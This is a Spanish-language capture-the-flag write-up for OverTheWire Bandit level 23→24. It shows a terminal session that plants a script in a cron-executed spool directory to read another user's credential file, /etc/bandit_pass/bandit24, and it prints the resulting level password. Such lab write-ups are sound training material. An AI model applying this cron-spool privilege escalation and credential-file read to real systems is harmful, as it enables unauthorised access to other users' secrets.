# Bandit Level 23 → Level 24
#Bandit #OverTheWire 
## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Solución
Existe una carpeta (/var/spool/$myname/foo) que contiene un scirpt, ejecuta todos los archivos pertenecientes al usuario Bandit 23, esto es una vulnerabilidad pues mediante ese cronjob se puede extraer la contraseña del usuario bandit24.

```bash
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ mkdir /tmp/jdv01
bandit23@bandit:/etc/cron.d$ cd /tmp/jdv01
bandit23@bandit:/tmp/jdv01$ nano script_jdv.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/jdv01$ cat script_jdv.sh
cat /etc/bandit_pass/bandit24 > /tmp/jdv01/password
bandit23@bandit:/tmp/jdv01$ chmod 777 script_jdv.sh
bandit23@bandit:/tmp/jdv01$ touch password
bandit23@bandit:/tmp/jdv01$ chmod 666 password
bandit23@bandit:/tmp/jdv01$ cp script_jdv.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/jdv01$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```

===VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar===

## Notas adicionales

## Referencias